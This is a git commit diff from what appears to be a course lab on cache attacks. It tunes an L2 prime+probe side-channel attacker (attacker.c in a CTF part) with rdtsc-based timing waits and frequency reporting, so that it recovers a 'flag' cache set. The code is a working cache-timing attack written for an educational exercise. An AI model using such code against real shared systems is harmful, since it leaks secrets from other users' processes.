4d7e85e1b3b92bf9c63d5f1cdf7a5bbb4ee672ad
Sean Blizard <emailseanblizard@gmail.com>
2026-03-09 15:19:33 -0400

    finish

--- lab-cacheattacks/Part3-CTF/attacker.c
+++ lab-cacheattacks/Part3-CTF/attacker.c
@@ -6,9 +6,9 @@
 #define NUM_L2_CACHE_SETS 1024
 #define L2_WAYS           16
 #define CACHE_LINE        64
-#define ACCESS_TIME_THRESHOLD 120
+#define ACCESS_TIME_THRESHOLD 120 
 #define BUFF_SIZE (L2_SIZE * (L2_WAYS + 2))
-#define ROUNDS 100 
+#define ROUNDS 500 
 
 void prime_set(volatile char *buf, int set) {
     for (int repeat = 0; repeat < 3; repeat++)
@@ -26,6 +26,16 @@ uint64_t probe_set(volatile char *buf, int set) {
     return slow;
 }
 
+static inline void wait_cycles(uint64_t cycles) {
+    uint32_t lo, hi;
+    asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
+    uint64_t start = ((uint64_t)hi << 32) | lo;
+    uint64_t end = start + cycles;
+    do {
+        asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
+    } while ((((uint64_t)hi << 32) | lo) < end);
+}
+
 int main(int argc, char const *argv[]) {
     void *buf= mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
 
@@ -36,27 +46,36 @@ int main(int argc, char const *argv[]) {
 
     int freq[NUM_L2_CACHE_SETS] = {0};
     int best_set = 0;
-    int best_count = 0;
+    
     while (1) {
         for (int round = 0; round < ROUNDS; round++) { 
        	    for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
                 prime_set((volatile char *)buf, set); 
                 
-	        for (volatile int j = 0; j < 200; j++);
-	    
+	   	wait_cycles(5000);
+
 	        uint64_t slow = probe_set((volatile char *)buf, set);	           
 		if (slow >= 1) {
                     freq[set]++;
-                    if (freq[set] > best_count) {
-                        best_count = freq[set];
+                    if (freq[set] > freq[best_set]) {
                         best_set = set;
                     }
 	        }	
     	    }
 	}
-	if (best_set > 0){
-            printf("Flag: %d, freq[flag]: %d\n", best_set, freq[best_set]);	
-	}
+	
+	int second_set = (best_set == 0) ? 1 : 0;
+    	for (int s = 0; s < NUM_L2_CACHE_SETS; s++) {
+            if (s != best_set && freq[s] > freq[second_set]) {
+            	second_set = s;
+	    }
+    	}	
+    	
+	printf("Flag: %d (freq: %d) | 2nd: %d (freq: %d) | ratio: %.1fx\n",
+        best_set, freq[best_set],
+        second_set, freq[second_set],
+        (float)freq[best_set] / (freq[second_set] + 1));
+    	fflush(stdout);
     }
     return 0;
 }
